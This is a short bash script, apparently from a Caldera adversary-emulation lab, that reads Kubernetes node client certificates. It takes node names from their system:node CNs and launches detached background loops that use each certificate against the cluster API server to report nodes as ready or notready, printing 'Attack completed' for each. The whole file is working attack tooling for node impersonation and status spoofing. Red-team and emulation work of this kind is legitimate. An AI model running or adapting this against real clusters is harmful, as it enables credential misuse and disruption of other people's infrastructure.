#!/usr/bin/env bash
set -euo pipefail

API_SERVER="https://$CLUSTER_NAME-control-plane:6443"
MODE="${MODE:-ready}"                    # ready | notready
BASE="$DATA_PATH/KC5"
LOG_DIR="$BASE/logs"
PID_LIST="$BASE/pids"

mkdir -p "$LOG_DIR"

node_from_pem() {
  openssl x509 -in "$1" -noout -subject 2>/dev/null \
    | sed -n 's/^subject=.*CN *= *system:node:\([^,/]*\).*/\1/p' | head -n1
}

for pem in "$BASE"/cert_node/*.pem; do
  [[ -f "$pem" ]] || continue
  NODE="$(node_from_pem "$pem")"
  if [[ -z "$NODE" ]]; then
    echo "SKIP $pem (CN is not system:node:*)" >&2
    continue
  fi

  LOG_FILE="$LOG_DIR/$NODE.log"
  echo "Run updater for $NODE with $pem (MODE=$MODE)"
  setsid env \
    API_SERVER="$API_SERVER" \
    CERT_PATH="$pem" \
    MODE="$MODE" \
    bash /opt/caldera/common/api-loop.sh \
      >"$LOG_FILE" 2>&1 < /dev/null &

  pid=$!
  echo "$pid" | tee -a "$PID_LIST"
  echo "Attack completed for $pem"
done

echo "PIDs in $PID_LIST"
echo "Log for each node in $LOG_DIR/*.log"
